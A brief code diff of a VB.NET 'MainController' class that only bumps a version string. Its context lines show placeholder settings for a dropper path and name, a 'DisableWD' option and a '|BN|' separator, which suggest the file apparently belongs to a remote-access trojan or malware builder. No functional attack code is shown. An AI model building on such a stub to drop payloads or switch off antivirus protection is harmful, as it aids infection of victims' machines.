@@ -50,7 +50,7 @@ Public Class MainController
     Public DropperPath As String = "[DropperPath]"
     Public DropperName As String = "[DropperName]"
     Public AntiWD As String = "[DisableWD]"
-    Public Ver As String = "v3.5 Public"
+    Public Ver As String = "v3.5.1 Public"
     Public st As Integer = 0
     Public Y As String = "|BN|"
     Public trd As Thread
